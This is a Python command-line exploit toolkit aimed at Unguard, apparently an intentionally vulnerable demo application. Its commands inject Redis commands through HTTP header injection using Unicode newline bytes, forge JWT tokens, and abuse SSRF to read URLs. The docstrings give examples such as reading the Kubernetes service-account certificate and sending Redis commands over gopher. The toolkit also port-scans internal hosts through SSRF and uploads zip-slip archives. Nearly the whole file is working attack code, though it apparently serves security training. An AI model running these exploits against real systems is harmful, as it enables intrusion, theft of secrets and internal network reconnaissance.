import click
import pickle
import requests
from requests_html import HTMLSession
import subprocess
import base64
import jwt
from decouple import config
frontend_base_path = config('FRONTEND_BASE_PATH')
ad_manager_path = config('AD_SERVICE_BASE_PATH')

@click.group()
def cli():
    pass


@cli.command()
@click.option('--redis-host',
              default='localhost:6379',
              help='Redis hostname/ip')
@click.option('--target',
              prompt='Unguard target',
              default='localhost:3000',
              help='The host and port where Unguard frontend runs (depending on your exploit choice)')
@click.argument('payload_file')
def redis(redis_host, target, payload_file):
    """Tries to send a query to the running redis instance through header injection."""
    click.echo('Exploiting redis (running on %s) through Unguard (running on %s) ' % (redis_host, target))
    session = requests.session()
    if not logged_in(session):
        click.echo("Not logged in. Run login command first.")
        return

    raw_payload = open(payload_file, "r").read()

    click.echo('Sending following redis commands (from %s):\n%s' % (payload_file, raw_payload))

    payload = prepare_injected_payload(raw_payload)
    frontend_payload = {'header': payload.encode("utf-8"), 'urlmessage': "http://" + redis_host}

    click.echo('Sending payload:')
    click.echo('---------START-OF-PAYLOAD---------\n%s' % payload)
    click.echo('----------END-OF-PAYLOAD----------')

    r = session.post(f'http://{target + frontend_base_path}/post', data=frontend_payload, allow_redirects=False)

    click.echo('Request returned status code %s.' % str(r.status_code))
    if r.status_code == 302:
        click.secho('Exploit successfully executed.', fg="green")
    else:
        click.echo(r.text)
        click.secho('Exploit failed. Response above.', fg="red", err=True)

@cli.command()
@click.argument('usertag')
def forge_token(usertag):
    """Forges a certain user's jwt-token and prints it to the command-line. Provide the usertag which is 'username:userid'"""
    session = requests.session()
    if not logged_in(session):
        click.echo("Not logged in. Run login command first.")
        return
    else:
        jwt_token = session.cookies.get('jwt')
        new_payload = '{"username": "'+usertag.split(':')[0]+'", "userid": '+usertag.split(':')[1]+'}'
        forged_jwt_token = subprocess.check_output(["node", "./jwt_payloads/jwt_exploit_script.js", jwt_token, base64.b64encode(new_payload.encode('ascii'))])

        click.echo("Forge user JWT-token: "+forged_jwt_token.decode("ascii"))
        session.cookies['jwt'] = forged_jwt_token.decode("ascii")

@cli.command()
@click.option('--url',
              prompt='SSRF URL:',
              default='http://example.com',
              help='URL to fetch using SSRF')
@click.option('--target',
              default='localhost:3000',
              help='The host and port where Unguard frontend runs')
def ssrf(url, target):
    """Accesses the contents of a URL through SSRF through the broken image posting feature of Unguard
    Works with any URL that the curl program accepts.

    As an example, pass the following urls as the url option:

    > http://example.com - Proof of concept

    > file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt - getting the API server certificate of the k8s api server

    > gopher://unguard-redis:6379/_CONFIG%20GET%20maxmemory - Accessing redis to let it execute CONFIG GET maxmemory

    """

    click.echo('Accessing URL (%s) through Unguard (running on %s) ' % (url, target))
    session = HTMLSession()
    if not logged_in(session):
        click.secho('Not logged in. Run login command first.', fg="red", err=True)
        return

    content = get_url_contents_ssrf(session, url, target)
    if content:
        click.secho('Exploit successful. Returned the following:', fg="blue")
        click.echo(content)
    else:
        click.secho('Exploit failed.', fg="red", err=True)

"""Validates a port range cli option"""
def validate_range(ctx, param, value):
    try:
        min, max = map(int, value.split('-', 2))
        if min > max:
            raise click.BadParameter('min port needs to be smaller than max port')
        return (min, max)
    except ValueError:
        raise click.BadParameter('port range needs to be in format [min]-[max]')

@cli.command()
@click.option('--host',
              prompt='Host that will be port-scanned:',
              default='localhost',
              help='Host that will be port-scanned')
@click.option('--target',
              prompt='Unguard target',
              default='localhost:3000',
              help='The host and port where Unguard frontend runs')
@click.option('--ports',
              prompt='Enter port range (example 8080-8085):',
              default='80-81',
              callback=validate_range,
              help='The range of ports to scan, including both min and max.')
def portscan(host, target, ports):
    """Tries accessing the selected host on all the ports specified
    """

    click.echo('Accessing %s on port range %s' % (host, ports))
    session = HTMLSession()
    if not logged_in(session):
        click.secho('Not logged in. Run login command first.', fg="red", err=True)
        return

    for i in range(ports[0], ports[1] + 1):
        content = get_url_contents_ssrf(session, host + ":" + str(i), target)
        if content:
            click.secho("[*] {0} on port {1} is open".format(host, str(i)), fg="green")
        else:
            click.secho("[*] {0} on port {1} seems closed".format(host, str(i)), fg="red")


@cli.command()
@click.argument('username')
@click.option('--target',
              prompt='Unguard frontend',
              default='localhost:3000',
              help='The host and port where Unguard frontend runs')
def login(username, target):
    """Logs the user in with the specified username, assuming the password is also the username.
    If it doesn't exist it will register it and then login."""
    click.echo('Logging in with %s ' % username)
    session = requests.session()

    user_data = {'username': username, 'password': username}

    try:
        r = session.post(f'http://{target + frontend_base_path}/register', data=user_data)
    except requests.exceptions.ConnectionError:
        click.secho(f'Couldn\'t connect to http://{target + frontend_base_path}/register.', fg="red", err=True)
        return 

    click.echo('Register returned status code %s.' % str(r.status_code))
    response = session.post(f'http://{target + frontend_base_path}/login',
                            data=user_data,
                            allow_redirects=False)

    click.echo('Login returned response code:\n %s.' % response.status_code)
    click.echo('Saving session cookies: %s' % session.cookies.get_dict())
    with open('cookies.dump', 'wb') as f:
        pickle.dump(session.cookies, f)

@cli.command()
@click.option('--target',
              prompt='Unguard frontend',
              default='localhost:3000',
              help='The host and port where Unguard frontend runs')
@click.option('--archive-path',
              prompt='Choose zip-archive which should be uploaded:',
              default='./zipslip_payloads/original-ads.zip',
              help='A archive with new images')
def ads_upload(target, archive_path):
    """ 
    Uploads an archive which will be extracted and displayed at the user ads.
    """
    session = HTMLSession()
    ad_manager_role = 'AD_MANAGER'
    
    if not logged_in_with_role(session, ad_manager_role):
        click.secho('Please login with user which has the role AD_MANAGER!', fg="red", err=True)
        return

    try:
        with open(archive_path, 'rb') as f:
            response = session.post(f'http://{target + frontend_base_path}/ad-manager/upload', files={"uploadZip": f})
    except FileNotFoundError:
        click.secho(f'Couldn\'t find file: {archive_path}', fg="red", err=True)
        return 

    
    print(response)


def prepare_injected_payload(payload: str):
    """Prepares redis payloads to be send via HTTP header injection in Apache HTTPClient"""
    newline = "\u560d\u560a"  # see https://issues.apache.org/jira/browse/HTTPCLIENT-1974
    header_value = '1' + newline  # 1 is the value of the header we control and then we inject a newline
    payload = payload.replace('\n', newline)  # prepare redis payload

    return header_value + payload

def get_url_contents_ssrf(session: HTMLSession, url: str, target: str, silent = True):
    frontend_payload = {'imgurl': url, 'description': "ug-exploit accessing " + url }

    r = session.post(f'http://{target + frontend_base_path}/post', data=frontend_payload, allow_redirects=True)


    if not r.status_code == 200:
        if not silent:
            click.echo('Request returned status code %s.' % str(r.status_code))
            click.echo(r.text)
            click.secho('Exploit failed. Response above.', fg="red", err=True)
        return None

    img_src = r.html.find('.card-body .col-auto img', first=True).attrs["src"]
    imgdata = img_src.split("data:image/jpg;base64,")[1]

    decoded = base64.b64decode(imgdata)
    return decoded

def logged_in(session):
    try:
        with open('cookies.dump', 'rb') as f:
            session.cookies.update(pickle.load(f))
            if session.cookies.get('jwt'):
                decoded_jwt =  jwt.decode(session.cookies.get('jwt'), options={"verify_signature": False})
                click.echo("Logged in as: \n -(jwt) %s \n -(jwt decoded) %s" % (session.cookies.get('jwt'), decoded_jwt))
                return True
            return False
    except:
        return False
        
def logged_in_with_role(session, role):
    try:
        with open('cookies.dump', 'rb') as f:
                session.cookies.update(pickle.load(f))
                if session.cookies.get('jwt'):
                    decoded_jwt = jwt.decode(session.cookies.get('jwt'), options={"verify_signature": False})
                    roles = decoded_jwt['roles']
                    click.echo("Logged in as: \n -(jwt) %s \n -(jwt decoded) %s" % (session.cookies.get('jwt'), decoded_jwt))

                    if len(roles) == 0 or not role in roles:
                        return False
                else:
                    return False
    except:
        return False
    return True